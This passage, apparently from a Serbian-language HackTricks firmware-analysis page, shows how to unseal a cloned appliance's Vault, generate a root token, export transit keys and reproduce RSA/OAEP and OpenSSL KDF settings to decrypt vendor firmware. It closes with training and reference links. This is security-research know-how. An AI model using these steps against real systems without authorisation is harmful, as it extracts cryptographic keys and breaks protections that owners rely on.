- Plaintext `vault operator unseal ...`, recovery ključeve, bootstrap tokene ili lokalne KMS auto-unseal skripte tretirajte kao ekvivalent materijalu privatnog ključa.

Ako appliance isporučuje originalni Vault binary i storage backend, replay tog okruženja obično je jednostavniji od ponovne implementacije Vault internals-a:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Sa root pristupom na kloniranom KMS-u:

- Učinite transit ključeve eksportabilnim samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
- Eksportujte unwrap ključ: `vault read transit/export/encryption-key/<name>`
- Isprobajte pronađeni RSA ključ sa tačnim parom padding/hash koji koristi KMS. Neuspešna PKCS#1 v1.5 dekripcija i neuspešna podrazumevana OAEP dekripcija **ne dokazuju** da je ključ pogrešan; mnogi Vault-backed tokovi koriste OAEP sa SHA-256, dok uobičajene biblioteke podrazumevano koriste SHA-1.
- Ako payload počinje sa `Salted__`, reprodukujte vendorov OpenSSL KDF tačno (`EVP_BytesToKey`, često MD5 na legacy appliance uređajima) pre pokušaja AES-CBC dekripcije.

Ovo pretvara „šifrovani firmware“ u opštiji problem: **oporavite operativne ključeve sa strane appliance uređaja, zatim offline reprodukujte tačne parametre unwrap + KDF**.

## Obuka i sertifikacije

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Razbijanje firmware-a pomoću Claude-a: veština na nivou seniora, autonomija na nivou juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologija testiranja bezbednosti firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktični IoT hacking: Definitivni vodič za napade na Internet stvari](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Iskorišćavanje zero-day ranjivosti u napuštenom hardveru – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Kako mi je pametni uređaj od 20 dolara omogućio pristup vašem domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sada ga vidiš: sada si pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Iskorišćavanje Tesla Wall Connector-a preko njegovog konektora za punjenje - 2. deo: zaobilaženje zaštite od downgrade-a](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Neka treperi: Over-the-Air iskorišćavanje Philips Hue Bridge-a](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
